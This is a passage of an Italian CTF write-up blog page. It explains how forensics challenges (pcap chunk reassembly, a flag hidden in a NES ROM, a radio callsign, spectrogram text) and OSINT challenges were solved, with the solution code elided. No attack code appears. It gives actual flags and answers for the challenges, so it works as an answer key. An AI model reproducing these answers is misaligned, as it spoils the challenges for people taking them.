+<p>Per trovare la flag, abbiamo quindi raccolto i dati in due stringhe separate e, nel primo caso, rimosso il rumore (byte nulli), poi provato a decodificarle su cyberchef.org.</p>
+<p>Qui abbiamo notato che la stringa ASCII era in realtà la flag codificata in base64.</p>
+<h4 id="script-python">Script Python<a hidden class="anchor" aria-hidden="true" href="#script-python">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pyshark</span><span class="o">,</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ... (codice invariato come nell’originale) ...</span>
+</span></span></code></pre></div><h3 id="unknown-traffic-2">Unknown Traffic 2<a hidden class="anchor" aria-hidden="true" href="#unknown-traffic-2">#</a></h3>
+<p>Questa challenge forniva un <code>pcap</code> (<code>traffic.pcap</code>) con traffico HTTP e ICMP misto, dove l’obiettivo era ricostruire un file suddiviso in più chunk.
+Analizzando il traffico, abbiamo notato due modalità con cui i frammenti erano incorporati:</p>
+<ul>
+<li>Nelle richieste HTTP, la query string portava base64 nel formato: <code>GET /data?chunk=N&amp;data=...</code></li>
+<li>Nei pacchetti ICMP, i payload includevano marker ASCII come: <code>CHUNK_N:...</code></li>
+</ul>
+<p>Dopo l’estrazione, ogni indice <code>chunk</code> corrispondeva a una parte specifica del file. Alcuni chunk apparivano più volte con dati sovrapposti; in quei casi, si è mantenuta la versione più lunga.</p>
+<p>Il processo di ricostruzione:</p>
+<ol>
+<li>Parsare il pcap come testo (<code>latin-1</code>) e fare match di entrambe le codifiche con regex.</li>
+<li>Raccogliere i frammenti e unirli in base all’indice <code>chunk</code>.</li>
+<li>Concatenare le parti in ordine crescente in un’unica stringa base64.</li>
+<li>Decodificare il blob base64 finale, aggiungendo padding quando necessario.</li>
+<li>Scrivere il risultato in <code>decrypt.bin</code>.</li>
+</ol>
+<p>Il file recuperato è risultato essere un’immagine PNG di un QR code (<code>680×680 RGBA</code>).</p>
+<p>Per semplificare, abbiamo evitato dipendenze pesanti (es. <code>pyshark</code>) e usato uno script minimale con solo <code>re</code> e <code>base64</code>.</p>
+<h4 id="soluzione-python">Soluzione Python<a hidden class="anchor" aria-hidden="true" href="#soluzione-python">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ... (codice invariato come nell’originale) ...</span>
+</span></span></code></pre></div><h4 id="nota">Nota<a hidden class="anchor" aria-hidden="true" href="#nota">#</a></h4>
+<p>Nel presente script non è incluso come scansionare il QR code, dato che può essere fatto con qualsiasi utility online/offline.</p>
+<h3 id="hidden-in-the-cartridge">Hidden in the Cartridge<a hidden class="anchor" aria-hidden="true" href="#hidden-in-the-cartridge">#</a></h3>
+<p>Questa challenge forniva una ROM NES: <code>space_invaders.nes</code>. La flag era nascosta direttamente nei dati della cartuccia tra byte apparentemente normali.</p>
+<p>Dopo aver estratto stringhe stampabili (con <code>strings</code>, un hex editor o uno script), spiccavano lunghe sequenze di <strong>due cifre esadecimali separate da <code>$$$</code></strong>, per esempio:</p>
+<pre tabindex="0"><code>63$$$74$$$66$$$7b ... 30$$$7d
+</code></pre><p>Due dettagli le rendevano sospette:</p>
+<ul>
+<li>Forma rigorosa: <code>[0-9a-f]{2}</code> ripetuto, sempre separato da <code>$$$</code>.</li>
+<li>I primi byte decodificati corrispondono a <code>63 74 66 7b</code> -&gt; <code>c t f {</code>, e l’ultimo blocco termina con <code>7d</code> -&gt; <code>}</code>.</li>
+</ul>
+<p>Per recuperare la flag, abbiamo raccolto tutti i blocchi in ordine, separato su <code>$$$</code>, convertito ogni coppia hex in byte, decodificato come testo e concatenato. Il plaintext risultante è la flag.</p>
+<h4 id="script-python-1">Script Python<a hidden class="anchor" aria-hidden="true" href="#script-python-1">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ... (codice invariato come nell’originale) ...</span>
+</span></span></code></pre></div><p>Questo stampa il token <code>ctf{...}</code> recuperato dalla ROM.</p>
+<h3 id="baofeng">Baofeng<a hidden class="anchor" aria-hidden="true" href="#baofeng">#</a></h3>
+<p>Questa challenge richiedeva di trovare il <code>callsign</code> e il <code>nome</code> di una città da una comunicazione radio effettuata con un Baofeng, allegata come mp3.</p>
+<p>Dopo un paio di ascolti, abbiamo cercato un tool (o creato un band-pass filter) per rimuovere il rumore.
+Pur non capendo il parlato, abbiamo usato un’AI per convertire <strong>audio</strong> -&gt; <strong>text</strong>.</p>
+<p>Abbiamo ottenuto questo testo:</p>
+<pre tabindex="0"><code>CQ, CQ, CQ, this is Yankee Oscar 2, Tango Sierra Sierra. My QTH is Kilo November 15, Kilo Sierra. CQ, CQ, CQ, this is Yankee Oscar 2, Tango Sierra Sierra.
+</code></pre><p>Grazie alla trascrizione, abbiamo capito che la location (aka <strong><code>QTH</code></strong>) era <code>KN15KS</code>, cioè il codice della città da trovare, mentre il callsign era “<em>Yankee Oscar 2, Tango Sierra Sierra</em>” che, in codice NATO, diventa <strong>YO2TSS</strong>, la prima parte della flag.</p>
+<p>Per trovare la seconda parte, è bastato cercare <code>KN15KS</code> su una <em>Maidenhead grid</em> per ottenere il nome della città: <strong><code>Hunedoara</code></strong>.</p>
+<p>Metti tutto insieme: <code>ctf{yo2tss_hunedoara}</code>.</p>
+<h3 id="3rd-child">3rd child<a hidden class="anchor" aria-hidden="true" href="#3rd-child">#</a></h3>
+<p>Breve task di audio forensics con testo spettrale nascosto in un canale audio.</p>
+<h4 id="descrizione-della-challenge">Descrizione della challenge<a hidden class="anchor" aria-hidden="true" href="#descrizione-della-challenge">#</a></h4>
+<blockquote>
+<p>My 3rd child believes in ghosts. I don&rsquo;t know how to prove they aren&rsquo;t real.</p></blockquote>
+<p>“Ghosts” → cerca qualcosa che normalmente non si sente ma si può <em>vedere</em> (spettrogramma).</p>
+<h4 id="file-fornito">File fornito<a hidden class="anchor" aria-hidden="true" href="#file-fornito">#</a></h4>
+<p><code>output.wav</code></p>
+<p>Analizzando <code>output.wav</code> in Audacity si vedono tre componenti: rumore broadband, un sottofondo musicale e un’altra traccia.
+La descrizione suggerisce di visualizzare lo spettrogramma dell’ultima traccia.</p>
+<p><img alt="alt text" loading="lazy" src="/images/3rdchild.png"></p>
+<h2 id="osint-">OSINT 🌏<a hidden class="anchor" aria-hidden="true" href="#osint-">#</a></h2>
+<h3 id="holiday-trip">Holiday Trip<a hidden class="anchor" aria-hidden="true" href="#holiday-trip">#</a></h3>
+<p>Questa OSINT richiedeva di trovare la posizione del negozio mostrato nell’immagine.</p>
+<p>Dopo varie ricerche con Google Lens e ChatGPT, eravamo bloccati. Tuttavia, abbiamo notato una tazza nell’angolo in alto a sinistra con scritto <strong><code>Golden_Sands</code></strong>. Abbiamo provato quella come flag e abbiamo risolto la challenge.</p>
+<h3 id="prison">Prison<a hidden class="anchor" aria-hidden="true" href="#prison">#</a></h3>
+<p>Questa OSINT richiedeva di trovare sia l’host del server sia il nome del proprietario di un server Minecraft. L’unico indizio era un’immagine con vari nickname e ruoli dei player.</p>
+<p>Dall’immagine, ho notato che lo username dell’owner iniziava con &ldquo;Leaky_&rdquo;, e c’erano altri player con ruoli come &ldquo;srwarden&rdquo;, &ldquo;warden&rdquo;, &ldquo;guard&rdquo; e &ldquo;srguard&rdquo;. Alcuni nomi visibili: PsychNOdelic, ButterInc, Cheese e Dragon. Il server aveva un tema prison.</p>
+<p>Per approfondire, ho usato la funzione di deep research di ChatGPT con questo prompt:</p>
+<blockquote>
+<p>Can you find a Minecraft server where the owner&rsquo;s name starts with Leaky_ and there are other players with roles like &ldquo;srwarden&rdquo;, &ldquo;warden&rdquo;, &ldquo;guard&rdquo;, &ldquo;srguard&rdquo; and names PsychNOdelic, ButterInc, Cheese, Dragon? The server seems prison-based.</p></blockquote>
+<p>Dopo un po’, ChatGPT ha trovato un server chiamato <strong>play.thepen-mc.net</strong>. Sul loro Discord ho potuto confermare lo username completo dell’owner: <strong>Leaky_Tandos</strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://pascalctf.github.io/it/tags/ctfatac/">Ctfatac</a></li>
+      <li><a href="https://pascalctf.github.io/it/tags/ctf/">Ctf</a></li>
+      <li><a href="https://pascalctf.github.io/it/tags/binary/">Binary</a></li>
+      <li><a href="https://pascalctf.github.io/it/tags/crypto/">Crypto</a></li>
+      <li><a href="https://pascalctf.github.io/it/tags/web/">Web</a></li>
+      <li><a href="https://pascalctf.github.io/it/tags/ctfatac2025/">Ctfatac2025</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://pascalctf.github.io/it/ctf/ctfatac2025_finals/">
+    <span class="title">« Precedente</span>
+    <br>
+    <span>Finali CTF@AC 2025</span>
+  </a>
+  <a class="next" href="https://pascalctf.github.io/it/ctf/scriptctf2025/">
+    <span class="title">Successivo »</span>
+    <br>
+    <span>scriptCTF 2025</span>
+  </a>
+</nav>
+
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Qualifiche on x"
+            href="https://x.com/intent/tweet/?text=CTF%40AC%202025%20Qualifiche&amp;url=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_quals%2f&amp;hashtags=ctfatac%2cctf%2cbinary%2ccrypto%2cweb%2cctfatac2025">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Qualifiche on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_quals%2f&amp;title=CTF%40AC%202025%20Qualifiche&amp;summary=CTF%40AC%202025%20Qualifiche&amp;source=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_quals%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Qualifiche on reddit"
+            href="https://reddit.com/submit?url=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_quals%2f&title=CTF%40AC%202025%20Qualifiche">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Qualifiche on facebook"
+            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_quals%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Qualifiche on whatsapp"
+            href="https://api.whatsapp.com/send?text=CTF%40AC%202025%20Qualifiche%20-%20https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_quals%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Qualifiche on telegram"
+            href="https://telegram.me/share/url?text=CTF%40AC%202025%20Qualifiche&amp;url=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_quals%2f">
+            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Qualifiche on ycombinator"
+            href="https://news.ycombinator.com/submitlink?t=CTF%40AC%202025%20Qualifiche&u=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_quals%2f">
+            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                <path
+                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://pascalctf.github.io/it/">Paolo</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
